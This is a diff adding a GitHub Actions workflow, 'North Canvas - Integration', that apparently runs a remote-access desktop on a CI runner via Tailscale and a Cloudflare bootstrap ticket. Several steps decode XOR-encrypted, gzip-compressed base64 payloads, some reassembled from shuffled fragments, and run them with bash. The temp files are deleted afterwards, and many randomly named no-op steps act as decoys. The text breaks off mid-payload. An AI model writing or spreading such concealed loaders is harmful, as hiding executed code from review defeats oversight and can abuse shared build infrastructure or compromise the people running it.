@@ -1,0 +1,843 @@
+# csm-managed-workflow-version: 2026100901
+name: North Canvas - Integration
+run-name: North Canvas - Integration · ${{ inputs.run_tag || 'manual' }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      run_tag:
+        description: Opaque runtime correlation key
+        required: false
+        default: manual
+        type: string
+      backup_prefix:
+        description: Isolated Actions Cache namespace for this instance generation
+        required: false
+        default: ''
+        type: string
+      mode:
+        description: Start fresh or restore the latest managed user-data backup
+        required: true
+        default: new
+        type: choice
+        options:
+          - new
+          - restore
+      machine_id:
+        description: Logical machine ID
+        required: true
+        default: '001'
+        type: string
+      machine_name:
+        description: Friendly machine name
+        required: false
+        default: 'UBUNTU-001'
+        type: string
+      runner_image:
+        description: Ubuntu GitHub-hosted runner image selected from the live actions/runner-images catalog
+        required: true
+        default: ubuntu-24.04
+        type: string
+      desktop_username:
+        description: Ubuntu local account used for SSH
+        required: true
+        default: admin
+        type: string
+      bootstrap_ticket:
+        description: Cloudflare bootstrap ticket
+        required: true
+        type: string
+      web_url:
+        description: Current Web URL
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  actions: read
+  issues: write
+
+concurrency:
+  group: managed-ubuntu-${{ inputs.machine_id || '001' }}
+  cancel-in-progress: true
+
+jobs:
+  desktop:
+    runs-on: ${{ inputs.runner_image }}
+    timeout-minutes: 360
+    env:
+      MACHINE_ID: ${{ inputs.machine_id || '001' }}
+      BACKUP_CACHE_PREFIX: ${{ inputs.backup_prefix || format('managed-desktop-ubuntu-{0}-', inputs.machine_id) }}
+      MACHINE_NAME: ${{ inputs.machine_name || 'UBUNTU-001' }}
+      DESKTOP_USERNAME: ${{ inputs.desktop_username || 'admin' }}
+      RUNNER_IMAGE: ${{ inputs.runner_image }}
+      MACHINE_MODE: ${{ inputs.mode || 'new' }}
+      WEB_URL: ${{ inputs.web_url }}
+    steps:
+      - name: Step-11474ec8e7a7
+        shell: bash
+        run: |
+          :
+      - name: Step-459435e14a59
+        shell: bash
+        run: |
+          :
+      - name: Step-b8c1efdf97c4
+        shell: bash
+        run: |
+          :
+      - name: Step-746ec2361d03
+        shell: bash
+        run: |
+          :
+      - name: Stage-001-cd5d9c
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -n "$RUNNER_TEMP"
+          umask 077
+          cat > "$RUNNER_TEMP/.wf-d8f9f0cb0c249ba9a58f.dat" <<'WF_FRAGMENTS_D037EA07344BA219'
+          lUiLPAPWh1xcdpU1ELsc7RfcMbaVZkCgo4VUIKIbxXwA8RbQHqMd3wBiLLPXibVn0d6kfFS3qoAo4hdwXnPPEYslnfqQDQ61
+          GjUho7dvVSgSioWwPz3zRTLbqCw6728FvKdHYvC5wo0oX2jV9TPjMZYfqyUET95CugBVG+vliG610a8r+R3MgW8ZZZBScF/2
+          im+jbaFM5FM8403eqyrpb4+UosSJhMzf1Q4xfmC7ycnsEeSRYZ4XcS+ZcXq/uWv1kSJaPwC4huafAHUeo5ZkO+aSbytirNrb
+          T4UsxlwW6Cisd/cx4WWoFo550Iz3LX08mWXdWAvkt0Dg/Y8PhjGzlDj3n1VCSDu5BI4OaIcUEl16emOM552CbM4yguuhDMtT
+          B7Wvy6bBLJr1QriGaPcKWJHTWkvWGQMYebFqZQKzycJuM8iJCFoIHIG8rCbSNX0zexr1iB4FrcoGzUmvFaFd6EO5ul5NuYhP
+          WeaZpUx6eaw6qDt2jlWP4Q4Bf3UT8OsSVtIX18usuU4RXfkGHdNt6XWW934ssCcnqB2mC+JP5wskDpPcEbPUVAcY3uPK1fmM
+          9I5QnSB7wvbs4u2cKD66PvboxGBxmF/rJfzqvCnGMV5NUPl5NP3EQk1LUxyGnrvtNOB3a0+pxVWEOd5T0+IHWgo7mfjco8E5
+          y+e+wIvA7x7eYq+Xsc7y7nW8yGU1nQ54+Wrvha21MR+eRlY2Y+MXcV0oPwLBvJ8hNbrNkcVLajM/eTZhQSN94+2Q3Q==
+          7+BtlMLjUjjELmPLydf3Qoj0TPFwQ80p24u6vOXatRSzT8BXGpXpe3WClC27FdV8a7hdXmTbmWCiU5SAFHYEZLTXJk6RjwXu
+          pcbELIo9QrznOAmR2rXRWN6B5TXc95u3vzFVCHlBW+JG1Bfv+vJtyaGJuv/fW/w4Zl7fvRlw+4b64/f4/fOgTx4eDtNS6S23
+          es+ZlKlLfweLC7A/we3/SWTTJuRrIZRHafKWZL/kIYO6Y5cB1Y9EGf9kCePwsMevhEZoTdkCWJgzKdbT8ZwByrcwghZZci9e
+          0wwAa7ga2Kh3LarI37gN4U7S0AHSM+UZlOGEmAJFKlQazpsIJm0+SXk8a1Plw7ZvRNg5TH4ouEvNjLuHPguBHcPpWozhyZs9
+          TgLbchtFn4FfymCSTOftCxGqtGg12xoBbJjkjrbtjA+mrrQH3T4yeDpVbVk+4o09tp+vZHlvR0dViVwA0JjsizGUygw1FvzF
+          AVWP58CeLTkW43ianrgRr217J5lBArOUjmRPdC6CMYnyci7sAbSWMXl1j5uhWRpSFYxZy8JKIHRplPnwq3NegnCv2nlBg7gh
+          7j9artCXC/ANeJSLVe+DFPNuc1gPS65t6BJq88H7m2EN+WC6+w48erErfxp6LZ7MxIb7PwSNJD1wmBhjfDI99a0vBdXvF9Iv
+          77JI2tJQBLLAaj9h81Au+H4BgD3lDzYwerCxHzjJVyobWJf4Pvn/PsNZroX+z8a9vgWo/f+jNTLQX6xI/dWuFoUsDRIEGM0Q
+          WF_FRAGMENTS_D037EA07344BA219
+      - name: Step-07c5f1e89f68
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH" "$RUNNER_TEMP/.wf-d8f9f0cb0c249ba9a58f.dat"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          stored = Path(os.environ['RUNNER_TEMP']) / '.wf-d8f9f0cb0c249ba9a58f.dat'
+          fragments = stored.read_text(encoding='ascii').splitlines()
+          stored.unlink()
+          order = [14,13,2,10,0,9,4,1,3,15,6,8,11,12,5,7]
+          payload = ''.join(fragments[i] for i in order)
+          key = bytes.fromhex('f1b452aed0970bf00f8731dc38805822e390dd077e6b3cd7')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-8091518e39d5
+        shell: bash
+        run: |
+          :
+      - name: Step-fd57dad78f1f
+        shell: bash
+        run: |
+          :
+      - name: Step-d6bf0fe3700c
+        shell: bash
+        run: |
+          :
+      - name: Step-222f84146829
+        shell: bash
+        run: |
+          :
+      - name: Step-18aa4ad1c47b
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              '8EdnI6mymkg647gnSJCl2lfd/zsgQJGUhfvJRfyUF+A3dW3uzfmc+vdfalM2ADCK3wBZyHOWZ6ULuMQvLaSL/YhXnjz7Cl63e6wN'
+              'dun70dQphkS8CPdEgZuzX9+NeYUPmmxjL8rHiPYBKRLyPji+I+FY43ClxDvkuYL9JsyqSVzKVmX9E9m3cAqxvIg0MnJRY+KPDIMT'
+              'lxVNDwlk269/hoTnvLqWD0kiXhd0GZMupYh1VOFOIVVxL8iVSLvPyRUCgY174sO3UTVEls8ONTWG+ItB6dOdZzPAfUDJbHGcNv2q'
+              'TwvSeUMrPY8I0LPVjXeH8cAUfL3Knzu2ObV7Fs9QQCqdRKezwgd0YCeELHLpUTAeXVInCc9vfyaZBWQlAwp/xAr/IGR7hmkbT+GZ'
+              'wboAPfU/2hKGqn/JaXtEreukhsdT95tTBrnZr8nSkjH+fFp+i8baz/bLG1W3ZpNK1OTlfPqOwXKKwX/gx0V/lKz92yj6SUAh1Gep'
+              'GC2fRPi2DWHan93XsIlEJ7adw6SorohPD2uQrKY3IlCj4wVEF4lYGBQYzy13GowdhX8xtPeAn4rHOBiPywETJjSUn4RZdzyBdSdQ'
+              'v/iohHfg+bIjU5qxL/+jQmJg1pkNUvCqQSvufUYuELPC/bxDwP+tmurt7ulA153lTXUUKPXIqfmCFFPpGTcKGC21'
+          )
+          key = bytes.fromhex('efcc6f23a9b29a48381c2db519ff3eea435820c23537b9bf')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-9e230e2a43ef
+        shell: bash
+        run: |
+          :
+      - name: Step-df1e95fc0590
+        shell: bash
+        run: |
+          :
+      - name: Step-a18d2522f686
+        shell: bash
+        run: |
+          :
+      - name: Step-4711d51f0a12
+        id: identity
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              '8fZTm11w46yHlyc6jpNd6jLMEcv/1ioxFHhRSktrU9kkgQk+sqGSAQQsXRCvaTEXZF1lVoHJFDKkHMrzMHhL+XwdIJPvgS40mIdY'
+              'Rv8BOWElYc7eLl1sYuLsfDNSm2dP2osxxcJNii/BCK439FkPG4Y5DZBwu566/C2mzpB08NbHEqwoVgDhiIHzktcAwvHTvz88UuA4'
+              'bUYysErIqd9mv15CNw750JwRCrN592d7D5+dt0Rjwtjp0Q63xqm/LjzOJ+IRJQbiaM88j70DcTxAX7MUhGkaqTv8qqxkzzH6R4SE'
+              'aHo='
+          )
+          key = bytes.fromhex('ee7d5b9b5d70e3ac85687ab75f199fda2289ce30ea95c69a')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-3fb018565627
+        uses: tailscale/github-action@v4
+        with:
+          oauth-client-id: ${{ env.TS_CLIENT_ID }}
+          oauth-secret: ${{ env.TS_CLIENT_SECRET }}
+          tags: tag:github-phone
+          hostname: ${{ steps.identity.outputs.ts_hostname }}
+          version: latest
+
+      - name: Step-e859a2dfbf82
+        shell: bash
+        run: |
+          :
+      - name: Step-279eb978301d
+        shell: bash
+        run: |
+          :
+      - name: Step-f9ce735c8c97
+        shell: bash
+        run: |
+          :
+      - name: Step-af338802055d
+        env:
+          BOOTSTRAP_TICKET: ${{ inputs.bootstrap_ticket }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'BE8oWZqkoLDRve3Weq8Zz4Lss6yJzPsl38mVsknh3ZDaGdCXo8Lb2MOB7jl04fO59ypITj9dT4P6DzosBKBuYD1vjb2iR1b5CS6S'
+              'v7Hy9qYcraVdv3Igr5U0g2/r/5PSvI2aqX39ur70AzoyhvRLTXdln9A255NY1Z3l+DYl/HLgnvPTK9Fl6FjdKHo8MLLVZQXTanZE'
+              '8BOUa9fPAYqhhmejHcOu+NbitXz2qV6QkB0YeUEOdd96EFxSLeQnkqf+01KrsA9JTIogwQfYzozxI1krONPUmMmdcC5ZxlQEf7ev'
+              'vNf5cwkk19veJUM381L6M/EyRsPxPtplHi7cRc1gXoMYKgNcjqDun20bAWmJtr1wZnUmSlDPDZUp39OPp+JTdKUaB5QW5YBc0bAI'
+              'PG9ziKOX/L1txf5tN9idix+I8P6gmYhWO6e1fAlxZPHB9K2LA0n8BK17nQ1reoVDeVustwQAOOf2LTYBGY6uveZxZjeM8fScbgF2'
+              'skZ0hPr3PZMC+dVm1oHj+N+ESO0d4zkG4CcR94uKlWj6SSVXMiEMkJwDLAReAUpaCd014Se/iwb/wflGrEXXFtoXw3gn5w0N9LVw'
+              'py7Kq1tOdRcomDG9NhSdaUlAvY0hJqMqLWm72fvywmmdtgf92RP5YqsYy8SWuOSZC3tdhSyPHZY6NI4P6eo1Ke6tlzflO27Men4w'
+              'hsJ9tv0lD03xOYOACGEwAC/jZQyL0ni8ixtIyNHPZMwzPtoIF96+F6WyLIpdOJE+ZFy+vW4NIBPZzmOm/exvrBPmZ8EReAvGl0kN'
+              'runydQT4Xcvz1HWS9FUhyXuRVPs='
+          )
+          key = bytes.fromhex('1bc420599aa4a0b0d34280852bc0828f8e9254fbd144d2ce')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-cb55fb084651
+        if: ${{ inputs.mode == 'restore' }}
+        uses: actions/cache/restore@v5
+        with:
+          path: /tmp/managed-desktop-backup
+          key: ${{ env.BACKUP_CACHE_PREFIX }}${{ inputs.runner_image }}-restore-${{ github.run_id }}
+          restore-keys: |
+            ${{ env.BACKUP_CACHE_PREFIX }}${{ inputs.runner_image }}-
+            ${{ env.BACKUP_CACHE_PREFIX }}
+
+      - name: Step-23c82d2a7952
+        shell: bash
+        run: |
+          :
+      - name: Step-c6b71d89f1b7
+        shell: bash
+        run: |
+          :
+      - name: Step-44b896a37b9c
+        shell: bash
+        run: |
+          :
+      - name: Step-88b161ac740d
+        if: ${{ inputs.mode == 'restore' }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'DTo7VLDWnOlKp7c9Ft2gbMl6Gxe07mJaaJn3P/nZecqScK+/IaKmQE+KdL/WygqQn/XOu6Zg/KIKvIIcqFxZ3xWUwArCVEWeFx8b'
+              'L8PuhnMbG/kxutftf5grbBGYl7PdGc5652dklj4BhS2C3iFic1onze78BWIRfUkxmIbEIMkI/Z6l2eY7Jop+2esMbyTKYhcGR9t5'
+              'kxGBVOZbulXTlZ2TQau/C0qgzHBktMW7HHEl2epEWmCgQGSa/z2mVEMnlLhfPFve/RB3CvwEiokgedN9PmxuNPMroWSHX5GueZc6'
+              '9/9qZuB7dPnK6xySKNx6JtG6UcCELqDgOWKg7eEWF0qUjP2GHvZxzoKFc1tm/mEP43/fMSAvfCZ50+wx6K5fItDg8G1FsxeSgskV'
+              't7QQpa+McXP1RNB35ZBgBtspn3wujf/H4dDRqVV2aYooLZlOB3LvbzNxcopPP6yJkuokzpCIz1StsiULPqpIQffksW4uG+zKSbe3'
+              '61FYd9442oDuH17gfano0k+ZZCRrVGOepeUit5cgUG8dUy5ficGonUicWwxjWJJi'
+          )
+          key = bytes.fromhex('12b13354b0d69ce948583aaf5b92622cd9fcf4eaa17de4fe')
+          ciphertext = base64.b64decode(payload)
+          compressed = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+          script = gzip.decompress(compressed).decode('utf-8')
+          Path(os.environ['CSM_OBF_SCRIPT_PATH']).write_text(script, encoding='utf-8')
+          CSM_OBF_PAYLOAD
+          bash --noprofile --norc -e -o pipefail "$CSM_OBF_SCRIPT_PATH"
+      - name: Step-3edcb453be2c
+        shell: bash
+        run: |
+          :
+      - name: Step-be3cb86ceab3
+        shell: bash
+        run: |
+          :
+      - name: Step-0df097fb263d
+        shell: bash
+        run: |
+          :
+      - name: Step-b5f8b03d8937
+        shell: bash
+        run: |
+          set -euo pipefail
+          export CSM_OBF_SCRIPT_PATH="$(mktemp)"
+          trap 'rm -f "$CSM_OBF_SCRIPT_PATH"' EXIT
+          python3 - <<'CSM_OBF_PAYLOAD'
+          import base64, gzip, os
+          from pathlib import Path
+          payload = (
+              'bqiOyD1H5gk7mnHKqWi0K3Ogum1b+5tKShYj8FCwR10AzkblMAyo63SzkYnLAilMIxXtQWkPLIYDu1PprSxvVVFdwMvWw9C96l7e'
+              '7LxG1pEuA5rXMLit7KbOffQK0cNnknlrvcrnHauOVqRqO+uP+bXvkkIicjr9b88bPAbqkjtUKEBH7+hSerdp7iHAXUZ3iepWv783'
+              '8rL3SZBFdoaxuXTFz8VRXk3BOy4+HL0MS2ax3gaHv+7To5eCg+8caPaxbIABlpr5UF8upm+vSFJo/uGr4LNL/VsjwGRk4MtU2bfL'
+              'oGnS4qOfsj0HwUUQRGhdMMwFaRKbhzNKon/Mw0LolIlwZ7YF6daEGT/bQ1Rb6/QdDK47xV6Vb7e5ubbxQa4ZZ6X4VLWmyofEVdnq'
+              'Ldlw05MAeQsN+zES9/LiQqpJ4BefKElx9NwsigdhX8NHx7+gdeaU+UwoIyV4qhiAXllRnA4l/khKEQ4fB+QRiUXJOPM1D4D3Wkz4'
+              'V3d71zapbCoj8ZlyHZ3FNvqeW2KYAr1+w3h2aB1zXqd1vmy3HQkJP6KOCtnq31fDlg/gIE2HkFafj91d/cy5W/HK+tlhGyYg2FcP'
+              'Cm4Benzl3vVc1YOZTXftoGfwEJRvRUKBPh8u6svab3a3r9OkoQsqZyZmBLNAZbNuAIUfL2Dub5RoI9e8Ngzjj/fDfpFutnYd2STB'
+              'cefx8hObQfvYdH5YRrdsri6mlKaQ8d5m36CdoqhWLSLqpe/WIR4KZ2qY55Nrvw1jlC3dB2haudYlC+AKNdcHDCglJYoN0m9829aV'
+              'COh1Z2emijUf0ThmHsAPtcsetjQmkDydiW7Bh/E8TH0/ecNdfC/wbWDFCcpKYwy+7jGDLdmp6I4oPSQGwuaqXzM0OeaER1N9ff6y'
+              'QH+AGpsx9YBUmM1vQIyNjchcs5zCZaZAGURX6NqIpV+z2kIfHJY5G9ILfXQgHtx3b3mId5WukJyT4MQ3J/TfVk1kRsmOBpXD2vhX'
+              'uDrYIf5mpjHsdWALc9lgJ23TuEo1MKdhIBZnxYcCPxMx6LsYd1I8A30nIii9v6KMN0J1BbrQ25l9vZNlz6yAjOeg+Rke5PxNkfIF'
+              'Y8mvaShwmSI75qgBQT5w4MczEHIglyGnhf2DBvOT9c8ebYj3kY3GGVtvbyJgVXgjKUFj8OABo1PadxZ7Ve3elEgUlzSBC+5M8Djg'
+              'kCBKDw5g+TpOATIc5ujFr3mkzQqpY3zvk53RXVCTsghsbO+8wJRmS9c4D7Q6K+tX+fqALn3AYjQ2D3KjRa1AHheJQxa+m0CgNNkW'
+              'ZahvFGGC3r8egO3ggdQGpJN/NaYO3OQX8Ncr/2x4IEBWtLS5v8qug77Jd4aAQDsGV9SFKXaqadRBzKMAneJaHzSuuNaTyVsp4plr'
+              'zkP1kEr4LXHjpdliYOctsGCWZ2SKCq1OLLgHvkwv639kiQUUtjxHtQfiW1V9aSJ/rFeYrcEoHoT4j5YqISjoi+v/mrvXAObTeUNW'
+              'Gl+ThreuGRewIzInjdtWeFsEjey3a33ppBuzX0xZfnzQpbbEm2F0Z4koQic7B4G33mwU+Q60IsBvdKtUJUGSWRVWxEO3x+Sd1r7p'
+              'KhvWAdlLQ5e0M75jwRmU2Efkk2UsRRl6QkjGS38Pi/iVatqHKZr2utYlD9MY6b8XC4bSZHzOeaQINQwvyMON7iYVxG2ML5dPpWvg'
+              'lhm136togGraXPXI0j7jcFGgDfUynNUz0y4uUNLitPB7Wy8lOMnZRTR+VWZlDekwdt0+0FwuBlvT/FOBfbXERmWePHFDKJ4H+Mr6'
+              'KJrGZzDUZ/lXEtN4RotHyXGsUVXFl7dLHXclIu0sf851pxK758FZFbpHM9aihKKOF+iM0STzuXL+hNGrqpM2JTg4fjTh767Unsh8'
+              'bo8xlSLlvghf2aZ8p8AHm7Ju24A3cdUN5+nvNFzT5buyZ8we/IlFXArjWitO/qWYuQzRy5zIxOGKJp1zr6LU/2Q0gWtRVJs79N1Y'
+              'dMehy4NU4fAv8TdkET7uCPItLUfc86oeMJOWTCzgKFVbJchuk6qihWdk8pwgnbHZLW/dF/3vcYP1+rio7bH/sUk7Hm9Wwuur6tmM'
+              'wyqBRQ0zQc/JxnA0X0SOgX+97EG1257bSIW+uGtE2V4vNTmHmR3gPl41wlmI3U/gUg+J1oN2VddR0JM20/r1l6bpyY6alxY/8YT6'
+              'tdzIf8dtfC962dV4G6ZsGrgf7XqxHCas4IrQ0FiLh1h9szp6X9sCi2nYjUTnyt54m+caQqWBX7eD5PP3asOkPl/b7YCWWVbs7Np6'
+              'pIL2lu5tSg/3rnappL/m8NR9DHjHDgKFjzDzFtb3/fjW3bX9CTwmOwfRNEk0k95Y4M+ab5KA6Sf0d7kK7NjvNEaN6EHfQPpmueqp'
+              'ac0tq2QEnLnlcewzPTWcb6RB5hfiRO108NVBCWuzG0RrQmKaqzltpR5fIQG4gnT8H0abqK54Z3wAQb+owf6iB5IU9aDGaOVgvG1C'
+              'W4K5FopRnHUntxPDmEDSf2x1Md0fJKJQF8Kp6s7oqe8DqVsiQlJhfhauTajsr8Loa4tRIP3QSx5hWs64XP3jWglJAdiqlxj6b6oG'
+              'jRLOx78J7rTBs5c56ljIAfp/Ie7aFQDnfFPm2M+cEmii+yJYMUR3vDhl8N7LJ4EoAaJZPxSspD0JsvCHmvRz4u4Km6poGTT8LM1d'
+              'I8r4mcxSjHpgWAI4gWcFo//PuTUHLF2aMzggxOtpx5d9IwHK5f9JPCLBzGGX5MJpVU2TBvwG5k+FjvBJPTscdht5rgXZt47xJ08V'
+              'wC0NZfjEwz5MYhSGQhRwrM4OpJeCTYBI5FQ7EVGrWpRMq8zbY7sDTrzTkPIxs9Nz19wZptblgpYyk45eWly8VUej5F2LoUVQwC3e'
+              'Cx3exoxFF7kSSx4JlfJgbrOj2NrgRFmsrC7ZnnaEhYezq6Lq4ggjv4UfmA2vVHnq1AYH56DKZWMbpESnwaxRLkVZO/SZsXa6N2JK'
+              'KKyLAmHhMDDaVLJhwqRGbiUSAhyLBqXyrlwImAk6NycE5Funf64t5foT+T32tN9pySFhOb34AejKIw64xOnXBF7oX9H1KHzvwqnP'
+              '+joHqNLmBuFxA9sHGkpK+osde9MaACCA1ZQ3vwd8u9sGNCoJWdtd1menb5Tm4hQyf2MgJOT0OquRgXqCYV7kLxZHITfWA9gyHKUP'
+              '5fd6A/65L+lMEnN3dmi/IBmx6KzF2KgW0cw984JzjLsYp0Cu2w1JYiAjHdKGVcb0qcp7fOp6/uUneo4TT1F3mGcj3Rqs2Eda7VcJ'
+              'hzu6NfcocEVd0nn1FlB0IYe5pFJZpSbEadjLHvy6lToANQd3UMDXib77Q+oW3BRZY9VVVUXgo/Qd7xb3aWmNHk6TiXZDfCMkJmYR'
+              'PPtKc5Ev9Pl/zslt5s6iomVVBVen+gNjNCANcI7age+PjJGB0viRby0hMsO5Kokf/bT19K4z4jJ3PwxFBJC77AMCxFu7WW+TAAWL'
+              '4LViUgI2koLLaUJWnRjfZO1JeEp8a7yCVoS1I3I0FGGkkhuDczxtZ//8h6zNZB5S2/X1XdqidtcwQzsMAyFKhzgHGHo6i67uGunl'
+              'qitX8DbR6kj21VQ17LonYD7FxvAbJuOYe7RXl5X9DkNUKhcgekDoab5Q7vhgxMVJBxMUa+AXnq9BBN8Ob7/tI8XbS/jUmF9ET94+'
+              'qh6gHAIhCWn/MEn3sAwyde1jPPZDLDst5i9UHCuP3uqHpVceng5oQMYDqOcnyewcQFmUrLViX3Ju6KflaAZZb4zMweDOOuAxFAEv'
+              'X7joLOg43RemLRug54iD8M2zTjQZEJRNFsgmC17VvqkcWb6kAVKbXbHBNjAqInj2XX3TXPxKJiMrW/Cm6SqhMDIP8uNh6CG5zs8L'
+              'caZ3tS2q6i/XtHXrt8CRgtfXHdlr8n55g66FEJaWHdtXMcBxBJuPf4lOOVNSF5WJFH1P4QK2jmVY2woZDC8f2a9GHZDpIV9LeAPv'
+              'vkTl/6vn6vAVvWmCIlVCn5vOcGfEl5qkutO9Ka36nv1yBpXpSvD1oucOvfl//b3oIBsnsKY50jZ87GLS0bG6k85QqghpTfiTvRZO'
+              'dFArBGYNKGV4/pY08RSXe9LLHPjoiBOIBifc7IVDw3gZbu9qSZah8Tl2+YnL2F31CzdN29rVAoM4fbCWatMAFC1hJI+VinlpV+a8'
+              'QRltoA0HQ0EDo7S2OnDbYTQfPGbuLXyux4wuLEqSqDxMhq2ygld/QNfj4Tz+EZZW1nOvWJF0CXalMs0XtyA/y3+QFWxuaCoaARbM'
+              '1s2oE8N0MCOuOYodbjJrTxcZoRgTZsky8IDXoF6QBhHH4n3S4+4u4VCevk1pcTCjYYXdXA9amtOCIy6IlRVve6YSfBf7tbQTMDk+'
+              '/Yl0fOBvkN1SQZVxh19VLELJbQS4/g12MdicsNScPncDuuhMzXM4SgRfdodh92SOv6n1XhHWKtYDLYREKqYoW7o7RSQqKGyEpgRK'
+              'UDuK6VEh7BgFYMoJQgXv7lIXwRke9OkZi2hcjC0hcocO23t4gUARxKiQm65nn0IVvpmD7eXGahReimV0cmUVkcPnHprKPJdzcOb0'
+              'z3XfKiPz2+rzWGpSORttvSu8plBS8nv7t+qKjVfYbpA8+qxKn8akAOX4cgdZkk5w7CQCR6d/Q8yuAgi8ZbTHFHNS6GK3dQo3orVt'
+              '6CqE4BdNJdFaccJA0+5s1bCl+AfSKTHAEat7lytZrpXnCZIg3UsQ6SJmc5JS53AbUaPxqe9sAWoOFpKWWtP/xydnjn1T9bZXx4/2'
+              'OqqlCrmr9n6q3rSNWOEuxiUP+OEzQckKmTHQhi2DIgh13mCUFjb6EIE2j+uaQSkIym2D/uOQsmcmsLMn1KAGU2K2H3THuDxCvCaw'
+              'mpEHVCaaTLxag5or5QyPYmWxHviCuaKbUCGlvaPM+7zap0gpznYQO6FHt8EY5K2WRQ4iJR579N4esgjWm6jONfssPhVRVqM9Onop'
+              '5fEbf33VXs7WPylAfMBAFJ/r9IKirS3dOyDcXjYV2c4sx41x2ySQak8bwuqSu/Q/PN0yNtij6fTiUNPWCPRIiUtutQToWzN2Cc9/'
+              'iHSAjKDS+LX2CGW9UQAD3zBr41bupxgpADFV7yqv/z/7sj77+3kgNjnlbLRN71VgyArFtY9ZaML1v4+4gzFIKddV8ttBhAHyFnvx'
+              '6LXr/a3Us99S67NcbHfhM80nkeY8IK/Z3JAUZbTrWiWCx++kKmaZHY3Ko+d0P3B6FoLdVCj7x3UlLOK8hwjyaBI58jaXMrENRKhb'
+              'chgwyZhMDRmMn4xabslb3lHcr1nAr5ZYPSImx2Pi6ZGQz95BM0bev/Kd5Todkgw6yKHp6gPzHS/P83dnX/fVpxN/eRbrHLXnEZFg'
+              '9p5R1oWIiET+/yNUR0stBVgflY6tho1OWJpv+kwHHsNFEtMwMLwTAPd3IIPrHzEOPJ96rz/8BozidKB71iP4s0WCX2gGnhfYtjgt'
+              'ExvO+uVc3hYgvceUVBmdwmQwCyWCLzYc5DN+uT/bfFE08HBeiKLopftwc0ykVvix0nNXqfltfCePoasyCq4VWjXJuiM9ea63IG5G'
+              'rynji19G/PPu4+eak6a/HQV2/HavYo4csbpyeNQED05OXMzWTHZmNZqZG8gS/DRzdPFndMshAv+/rKjx9amha5C8imiPjpYrcNCi'
+              'hsiNPiLILcpQKxK6F2UNUuZ0RxEk5WKX0HBCgiE8hix7oCuu+RyV/8quST3URdq2WNRtxh4xYlalzAObYy9CDiu0vtaJHCgbmrY1'
+              'eDKcQxct7mdvG0zAl6ybZF74ZjdZvutm8NniHtQikLqU5wdsjEuAhTYa0WdQcnf0T52HOS/NJm3CcgVIEinquXZcsmzJphPYhHYc'
+              'BARgvHGBamAAm3D1gi+sLeP4Yq26mwzUMoohjVaPSwr0ivhb5UGZJZOErZ7ryBT/U3XnvQp/S4OWnFfDbSq3WJMJ3d1l8MMV6mOH'
+              '1TKHfd8RudbrCnIqjou9y0n+ZMLHuhBuqEOa2iV3zrMBFq6cVXwiq5Zf5PYYRvw2hKoNe1AHZRPeiyH3/Bd5L96vyvKbfJVHKJu1'
+              'kRu0RWXqCtL5JwOdrX30n0l8mzB5s1Zq419VFYeuytzEnUQhlhIulVNBcPmac9fB2JApZawz8IPL7eUP18hrSWaQO+e8uRMXodyS'
+              'XQEANUHKVArWpGROZxwMz0kNRabKr56GPjwzyFhosP8hmrw7He3zDw1ODh8DcnrNrkXiFEXwOk5a4A40Md9QxNmmTU2sBjSArh9P'
+              'KJgxvjmeBAiqD4gbjAGdj2QdZflnOS2gLL2ZWslFnamQ+oxtxVz9edJegkCAOi+bVsUHsfRUJ5hOVphh24j6fcJ6nB+g3U1hUxgN'
